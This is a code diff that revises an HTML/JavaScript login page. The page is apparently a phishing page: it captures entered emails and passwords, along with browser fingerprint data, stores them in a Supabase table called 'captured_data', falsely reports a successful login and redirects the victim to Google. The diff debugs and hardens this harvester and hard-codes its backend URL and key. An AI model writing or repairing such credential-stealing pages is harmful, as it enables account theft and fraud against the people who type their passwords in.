@@ -176,7 +176,7 @@
         <div class="error-message" id="errorMessage"></div>
         <div class="success-message" id="successMessage"></div>
 
-        <form id="loginForm" onsubmit="handleLogin(event)">
+        <form id="loginForm">
             <div class="form-group">
                 <label for="email">Email Address</label>
                 <input type="email" id="email" placeholder="Enter your email" required>
@@ -194,7 +194,7 @@
                 <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
             </div>
 
-            <button type="submit" class="login-btn" id="loginBtn">
+            <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                 <span id="btnText">Login</span>
                 <div class="loading" id="loading"></div>
             </button>
@@ -202,16 +202,15 @@
     </div>
 
     <script>
-        // Supabase configuration
-        const SUPABASE_URL = 'https://aqynejlgjwdmxsekuyld.supabase.co';
-        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        // Supabase configuration - use different variable names to avoid conflicts
+        const supabaseUrl = 'https://aqynejlgjwdmxsekkyld.supabase.co';
+        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuk';
         
-        // Initialize Supabase
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+        // Initialize Supabase with different variable name
+        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
         
-        async function handleLogin(event) {
-            event.preventDefault();
-            
+        // Make handleLogin globally accessible
+        window.handleLogin = async function() {
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
             const remember = document.getElementById('remember').checked;
@@ -244,8 +243,10 @@
             loading.style.display = 'block';
             
             try {
+                console.log('Attempting to save data...');
+                
                 // Save to Supabase
-                const { data, error } = await supabase
+                const { data, error } = await db
                     .from('captured_data')
                     .insert([
                         {
@@ -258,21 +259,19 @@
                                 language: navigator.language,
                                 screenResolution: `${window.screen.width}x${window.screen.height}`,
                                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                                platform: navigator.platform,
-                                cookiesEnabled: navigator.cookieEnabled
+                                platform: navigator.platform
                             },
                             created_at: new Date().toISOString()
                         }
-                    ])
-                    .select();
+                    ]);
                 
                 if (error) {
                     console.error('Supabase error:', error);
-                    errorMessage.textContent = 'Error saving data: ' + error.message;
+                    errorMessage.textContent = 'Error: ' + error.message;
                     errorMessage.style.display = 'block';
                 } else {
                     console.log('✅ Data saved successfully:', data);
-                    successMessage.textContent = 'Login successful!';
+                    successMessage.textContent = 'Login successful! Redirecting...';
                     successMessage.style.display = 'block';
                     
                     // Redirect to Google after 2 seconds
@@ -291,33 +290,43 @@
                 btnText.style.display = 'inline';
                 loading.style.display = 'none';
             }
-        }
+        };
         
-        function forgotPassword(event) {
+        // Make forgotPassword globally accessible
+        window.forgotPassword = function(event) {
             event.preventDefault();
             alert('Please contact support to reset your password.');
-        }
+        };
         
-        // Test Supabase connection on page load
+        // Test Supabase connection
         async function testConnection() {
             try {
-                const { data, error } = await supabase
+                const { data, error } = await db
                     .from('captured_data')
                     .select('count', { count: 'exact', head: true });
                 
                 if (error) {
-                    console.error('Supabase connection error:', error);
-                    console.log('Make sure you have created the "captured_data" table in Supabase');
+                    console.error('❌ Supabase connection error:', error.message);
+                    console.log('Make sure you have created the "captured_data" table');
                 } else {
                     console.log('✅ Supabase connected successfully');
+                    console.log('Table "captured_data" is ready');
                 }
             } catch (err) {
-                console.error('Supabase connection failed:', err);
+                console.error('❌ Connection failed:', err.message);
             }
         }
         
         // Test connection when page loads
-        testConnection();
+        window.addEventListener('load', testConnection);
+        
+        // Add Enter key support
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleLogin();
+            }
+        });
     </script>
 </body>
 </html>
